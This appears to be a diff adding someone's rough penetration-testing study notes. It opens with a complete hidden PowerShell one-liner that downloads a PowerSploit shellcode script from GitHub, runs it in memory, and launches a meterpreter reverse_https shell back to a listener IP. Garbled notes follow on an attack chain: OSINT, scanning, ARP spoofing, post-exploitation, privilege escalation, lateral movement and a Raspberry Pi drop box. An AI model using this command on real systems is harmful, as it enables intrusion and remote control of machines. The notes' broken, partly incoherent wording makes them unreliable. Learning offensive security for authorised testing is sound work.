@@ -1,0 +1,28 @@
+Once you get into system how to convert to dragonball meterpreter
+
+Our final PowerShell command will look like this:
+● Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object
+Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploi
+-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -
+Lhost 192.168.30.129 -Lport 80
+ 
+1
+After Binary exploitation is the first bullet
+
+OSINT (finding password lists, 
+SCANNERS
+
+during Metasploit is fixing the second bullet
+
+Bullets (from before in 1, Binary exploitation
+On The network = (once you applied any of the things bullets in the book below of web attacks and got shell so all the once before are bullets)
+(means things I can do it now since I'm in the network but I'm still not inside some PC)
+(the arp one is the card to absorb or make spagitation hole to be the router before the router and route only one device)
+(whi fi is like the light white street for all the packets we rnning)
+
+After the arp is when you already inside, after scanning the system comes post exploitation , then previledge excelation
+
+after that comes letaral movement etc
+
+
+Bullet Pentesting Drop Box - Raspberry Pi 2
